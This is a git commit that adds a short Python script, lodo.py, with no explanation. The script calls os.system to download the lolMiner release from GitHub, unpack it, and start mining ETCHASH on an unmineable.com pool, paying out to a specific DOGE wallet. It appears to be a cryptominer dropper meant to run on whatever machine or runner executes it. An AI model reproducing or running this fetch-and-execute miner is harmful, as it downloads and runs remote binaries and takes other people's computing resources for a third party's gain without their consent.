998963b6a47dc970fefd812541bd73fd31dc60cb
asimeci <111687955+asimeci@users.noreply.github.com>
2022-09-26 07:05:12 +0000

    Create lodo.py

---
+++ lodo.py
@@ -0,0 +1,4 @@
+import os
+
+command = "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && ./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+tcp://etchash.unmineable.com:13333 --user DOGE:DA6CNXPGacPWBTLrVq3b1b9uhpWiH1QWda.nemo99#3m34-lfsa"
+os.system(command)
